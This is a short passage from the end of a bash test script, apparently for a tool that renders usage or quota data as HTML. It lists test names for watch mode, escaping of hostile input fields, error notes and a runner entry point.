  test_024_one_shot_prints_path_exits_0
  test_025_watch_mode_rewrites_and_clean_sigint
  test_026_meta_refresh_and_skip_section
  test_027_opener_refusal
  test_028_spaced_script_path_runs
  test_029_codex_cumulative_last_no_timestamp_tiebreak
  test_030_hostile_quotas_payload_escaped
  test_031_watch_warmup_opens_existing_html
  test_032_home_flag_overrides_harness_env
  test_033_unreadable_file_named_in_notes
  test_034_ts_less_record_named_not_silent
  test_035_truncated_cache_recovers_honestly
  test_036_hostile_token_field_escaped_and_coerced
  echo ""
  log_pass "All $TEST_NAME tests passed"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  if [[ $# -ge 1 ]]; then check_deps; setup_fixture; "$1"; else main; fi
fi
